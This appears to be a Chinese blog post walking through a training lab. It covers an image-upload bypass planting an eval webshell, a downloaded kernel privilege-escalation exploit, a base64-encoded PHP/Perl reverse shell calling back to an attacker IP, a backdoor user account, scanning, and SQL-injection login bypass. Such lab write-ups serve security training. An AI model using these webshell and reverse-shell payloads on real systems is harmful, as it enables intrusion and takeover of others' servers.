@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>神马培训 | 栈桥仔</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="文件上传找到上传点  上传一张正常图片，可以看到图片可以上传成功  再次上传该图片，使用burp抓包，发送到Repeater模块，修改文件后缀，将jpg文件后缀更改为php文件后缀，然后运行，查看页面是否返回路径，返回路径说明上传成功，相反，失败。  复制上传路径，在页面打开看看返回信息，如果能返回信息，说明正确。因为是将后缀改成了php所以页面返回乱码，而不是图片  在图片的乱码中添加一句话木马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="神马培训">
+<meta property="og:url" content="https://zhanqiaozai.github.io/2020/07/25/%E7%A5%9E%E9%A9%AC%E5%9F%B9%E8%AE%AD/index.html">
+<meta property="og:site_name" content="栈桥仔">
+<meta property="og:description" content="文件上传找到上传点  上传一张正常图片，可以看到图片可以上传成功  再次上传该图片，使用burp抓包，发送到Repeater模块，修改文件后缀，将jpg文件后缀更改为php文件后缀，然后运行，查看页面是否返回路径，返回路径说明上传成功，相反，失败。  复制上传路径，在页面打开看看返回信息，如果能返回信息，说明正确。因为是将后缀改成了php所以页面返回乱码，而不是图片  在图片的乱码中添加一句话木马">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091445851.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091559881.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091752731.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715092826103.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093327206.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093439811.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093629429.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093753781.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093824524.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715100550432.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715100841177.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715101014327.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715101447782.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715102933268.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103053164.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103122196.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103254238.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103532619.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103809478.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103855295.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104024194.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104143692.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104616113.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104805665.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105023380.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105146419.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105357560.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105442103.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105945921.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715110103640.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715110358094.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111232072.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111350009.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111450894.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111749443.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111953521.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715113008271.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715113146868.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141329679.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141720932.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141958853.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715142136524.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715142406921.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715143239730.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715143708652.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144147152.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144228855.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144644012.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144833750.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715145058441.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715145659286.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150514414.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150600196.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150917265.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715151244021.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715151515218.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152156668.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152556277.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152629952.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153011666.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153553499.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153715522.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153933440.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715154320109.png">
+<meta property="article:published_time" content="2020-07-25T01:16:56.509Z">
+<meta property="article:modified_time" content="2020-07-16T01:02:18.316Z">
+<meta property="article:author" content="zhanqiaozai">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091445851.png">
+  
+    <link rel="alternative" href="/atom.xml" title="栈桥仔" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">zhanqiaozai</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">zhanqiaozai</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">zhanqiaozai</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-神马培训" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/%E7%A5%9E%E9%A9%AC%E5%9F%B9%E8%AE%AD/" class="article-date">
+  	<time datetime="2020-07-25T01:16:56.509Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      神马培训
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>找到上传点</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091445851.png" alt="image-20200715091445851"></p>
+<p>上传一张正常图片，可以看到图片可以上传成功</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091559881.png" alt="image-20200715091559881"></p>
+<p>再次上传该图片，使用burp抓包，发送到Repeater模块，修改文件后缀，将jpg文件后缀更改为php文件后缀，然后运行，查看页面是否返回路径，返回路径说明上传成功，相反，失败。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091752731.png" alt="image-20200715091752731"></p>
+<p>复制上传路径，在页面打开看看返回信息，如果能返回信息，说明正确。因为是将后缀改成了php所以页面返回乱码，而不是图片</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715092826103.png" alt="image-20200715092826103"></p>
+<p>在图片的乱码中添加一句话木马（尽量不要添加在图片中乱码括号的内部），再次进行提交，查看页面是否返回上传路径</p>
+<p>这里加入phpinfo是为了测试页面是否返回成功，如果返回成功显示phpinfo </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	eval(@_POST["pass"]);phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>复制该路径，在页面中进行访问</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093327206.png" alt="image-20200715093327206"></p>
+<p> 页面返回了phpinfo说明上传成功</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093439811.png" alt="image-20200715093439811"></p>
+<p>使用蚁剑或者菜刀进行连接，复制url，蚁剑连接密码就是一句话木马中，方括号中的内容<code>pass</code></p>
+<p>这样就连接成功了，一般flag文件都在根目录下。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093629429.png" alt="image-20200715093629429"></p>
+<p>选择到根目录，找一下flag文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093753781.png" alt="image-20200715093753781"></p>
+<p>找到flag文件，双击打开，里面就是flag值</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093824524.png" alt="image-20200715093824524"></p>
+<h4 id="对靶机进行提权"><a href="#对靶机进行提权" class="headerlink" title="对靶机进行提权"></a>对靶机进行提权</h4><p>使用蚁剑的终端打开，使用<code>uname -a</code> 查看版本或者<code>cat /proc/version</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这里的Ubuntu版本时16.04。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ubuntu 16.04 版本且 unprivileged_bpf_disable 权限没有关闭的情况下就会存在 提权漏洞</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看是否存在unprivileged_bpf_disable文件，如果存在该文件，查看文件内容是否为1，若不是1，则存在漏洞</span></span><br></pre></td></tr></table></figure>
+
+<p>查看方式：<code>cat /proc/sys/kernel/unprivileged_bpf_disable</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715100550432.png" alt="image-20200715100550432"></p>
+<p><strong>下载poc文件</strong></p>
+<p>下载地址：<a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/up … mp;isappinstalled=0</a></p>
+<p>下载后，复制连接，使用wget进行下载 ，下载完成后并不是我们要的名字，所以将文件重命名，把 .c 后的内容删除</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715100841177.png" alt="image-20200715100841177"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715101014327.png" alt="image-20200715101014327"></p>
+<p>编译生成可执行文件，并赋予可执行权限</p>
+<p><code>gcc -o upstream upstream44.c</code>可以将upstream只写u </p>
+<p><code>gcc -o u upstream44.c</code></p>
+<p>在给文件一个执行的权限</p>
+<p><code>chmod a+x upstream</code></p>
+<p>如果是在当前执行<code>./upstream44.c</code>是失败的，虽然也是返回shell，但是还是连接当前的权限</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715101447782.png" alt="image-20200715101447782"></p>
+<p>所以我们需要上传一个反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function which($pr) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">path = execute(<span class="string">"which <span class="variable">$pr</span>"</span>); </span></span><br><span class="line">return ($path ? $path : $pr); </span><br><span class="line">&#125; </span><br><span class="line">function execute($cfe) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res = <span class="string">''</span>; </span></span><br><span class="line">if ($cfe) &#123; </span><br><span class="line">if(function_exists('exec')) &#123; </span><br><span class="line"><span class="meta">@exec($</span><span class="bash">cfe,<span class="variable">$res</span>); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">res = join(<span class="string">"\n"</span>,<span class="variable">$res</span>); </span></span><br><span class="line">&#125; elseif(function_exists('shell_exec')) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res = @shell_exec(<span class="variable">$cfe</span>); </span></span><br><span class="line">&#125; elseif(function_exists('system')) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line"><span class="meta">@system($</span><span class="bash">cfe); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">res = @ob_get_contents(); </span></span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; elseif(function_exists('passthru')) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line"><span class="meta">@passthru($</span><span class="bash">cfe); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">res = @ob_get_contents(); </span></span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; elseif(@is_resource($f = @popen($cfe,"r"))) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res = <span class="string">''</span>; </span></span><br><span class="line">while(!@feof($f)) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res .= @fread(<span class="variable">$f</span>,1024); </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">@pclose($</span><span class="bash">f); </span></span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">return $res; </span><br><span class="line">&#125; </span><br><span class="line">function cf($fname,$text)&#123; </span><br><span class="line"><span class="meta">if($</span><span class="bash">fp=@fopen(<span class="variable">$fname</span>,<span class="string">'w'</span>)) &#123; </span></span><br><span class="line"><span class="meta">@fputs($</span><span class="bash">fp,@base64_decode(<span class="variable">$text</span>)); </span></span><br><span class="line"><span class="meta">@fclose($</span><span class="bash">fp); </span></span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">$</span><span class="bash">yourip = <span class="string">"Ip"</span>; </span></span><br><span class="line"><span class="meta">$</span><span class="bash">yourport = <span class="string">'Port'</span>; </span></span><br><span class="line"><span class="meta">$</span><span class="bash">usedb = array(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>. </span></span><br><span class="line">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". </span><br><span class="line">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". </span><br><span class="line">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". </span><br><span class="line">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". </span><br><span class="line">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". </span><br><span class="line">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; </span><br><span class="line">cf('/tmp/.bc',$back_connect); </span><br><span class="line"><span class="meta">$</span><span class="bash">res = execute(<span class="built_in">which</span>(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc <span class="variable">$yourip</span> <span class="variable">$yourport</span> &amp;"</span>); </span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在kali中进行端口监听</p>
+<p><code>nc -lvp [Port]</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715102933268.png" alt="image-20200715102933268"></p>
+<p>shell上传成功，我们就来访问一下这个shell，在查看kali，这样就可以看到已经监听到了这个shell</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103053164.png" alt="image-20200715103053164"></p>
+<p>可以使用ls查看</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103122196.png" alt="image-20200715103122196"></p>
+<p>我们先输入u，查看，在输入id 查看当前权限，输入<code>./u</code>在输入id查看当前权限</p>
+<p>可以成功看到当前全县是root了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103254238.png" alt="image-20200715103254238"></p>
+<p>使用passwd改一下密码，这里更改完远程连接root是不能直接登录的。</p>
+<p>因为Ubuntu通常情况下会禁止直接连接root</p>
+<p><code>ssh root@Ip</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103532619.png" alt="image-20200715103532619"></p>
+<p>所以我们新建一个用户，然后登录这个用户。</p>
+<p><code>useradd test</code> 、<code>passwd test</code> 设置密码</p>
+<p>使用ssh连接test接口</p>
+<p><code>ssh test@Ip</code>，这个时候就能重新连接了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103809478.png" alt="image-20200715103809478"></p>
+<p>在使用su登录root，可以看到现在就变成了root权限了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103855295.png" alt="image-20200715103855295"></p>
+<p>可以看到flag文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104024194.png" alt="image-20200715104024194"></p>
+<p>cat 一下这个文件。查看里面的内容，里面就是flag文件 </p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104143692.png" alt="image-20200715104143692"></p>
+<h4 id="主机发现和端口扫描"><a href="#主机发现和端口扫描" class="headerlink" title="主机发现和端口扫描"></a>主机发现和端口扫描</h4><p>使用<code>netdiscover -r 172.24.10.0/24</code></p>
+<p>就会把网址给搜索出来，这是知道ip的情况下</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104616113.png" alt="image-20200715104616113"></p>
+<p>如果不知道ip直接使用<code>netdisconver</code>来全部扫描，这样扫描需要等待一段时间，因为他要查找。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104805665.png" alt="image-20200715104805665"></p>
+<p>扫描到之后我们可以使用Nmap查看开放了哪些服务</p>
+<p><code>nmap -sv 172.24.10.142</code> </p>
+<p>可以看到开放了一个80和22端口</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105023380.png" alt="image-20200715105023380"></p>
+<p>使用<code>nmap -O 172.24.10.142</code>查看版本，可以看到是一个linux系统</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105146419.png" alt="image-20200715105146419"></p>
+<p>我们访问22接口，以为我们不知道密码所以先取消，在页面访问80端口，返回页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105357560.png" alt="image-20200715105357560"></p>
+<p>这样我们需要找一下漏洞，可以看到url返回id，可能存在sql注入，使用单引号和%df来查看是否有sql注入，经过测试发现页面都返回正常</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105442103.png" alt="image-20200715105442103"></p>
+<p>看看是否有其他漏洞，在搜索框输入1，看到url中的key显示1</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105945921.png" alt="image-20200715105945921"></p>
+<p>检查一下这个内容是怎么提交的</p>
+<p>可以看到他是value值进行提交上去的，这个时候就会产生xss漏洞</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715110103640.png" alt="image-20200715110103640"></p>
+<p>我们试试xss漏洞是否可行</p>
+<p><code>&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<p>可以看到他将我们的xss进行url编码了，所以并没有弹框，说明这里没有xss漏洞</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715110358094.png" alt="image-20200715110358094"></p>
+<p>我们可以使用御剑，或者dirsearch来爆破后台、目录</p>
+<p>这里使用dirsearch，先进入dirsearch的目录，使用python3运行</p>
+<p>格式：<code>python3 dirsearch -u  url/* php</code></p>
+<p>怎么知道它的类型是php的呢，直接在页面的url后面加入index.php页面还是返回当前页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111232072.png" alt="image-20200715111232072"></p>
+<p>可以看到搜索出一个admin/login.php，我们就找到了他的后台</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111350009.png" alt="image-20200715111350009"></p>
+<p>在页面中进行访问，这样就进入了他的后台，因为他的账号和密码我们是不知道的</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111450894.png" alt="image-20200715111450894"></p>
+<p>所以我们先使用万能密码尝试登陆</p>
+<p>使用<code>admin&#39;</code>密码随便输入，页面返回操作数据库失败</p>
+<p>并返回了以下重要内容，从这里就可以判断这里存在sql注入，因为他把我们admin上面带的单引号给带入了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111749443.png" alt="image-20200715111749443"></p>
+<p>我们将单引号后面加上注释符，再次登录查看页面返回，可以看到页面返回输入的密码错误</p>
+<p>说明他去把用户名进行查询，然后在将我们输入的密码和他的密码进行对比，然后密码不正确，所以登录不进去</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111953521.png" alt="image-20200715111953521"></p>
+<p> 可以进行一个盲注</p>
+<p>格式：<code>admin&#39; and sleep(5)</code>，可以看到页面进行了延迟，通过这种注入方式得到最后的后台密码admin</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715113008271.png" alt="image-20200715113008271"></p>
+<p>使用admin、admin登录，这样就成功登录到后台去了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715113146868.png" alt="image-20200715113146868"></p>
+<h4 id="代码审计sql注入"><a href="#代码审计sql注入" class="headerlink" title="代码审计sql注入"></a>代码审计sql注入</h4><p>进入靶场文件，进入admin，查看admin下的 内容</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141329679.png" alt="image-20200715141329679"></p>
+<p>输入IP找到后台在页面抓一下包，提交信息，查看Networdk会发现login.php=ck.php</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141720932.png" alt="image-20200715141720932"></p>
+<p>等会就会返回login.php</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141958853.png" alt="image-20200715141958853"></p>
+<p>cat查看一下login.php的源码，可以看到判断登录的地方$action=ch_login</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715142136524.png" alt="image-20200715142136524"></p>
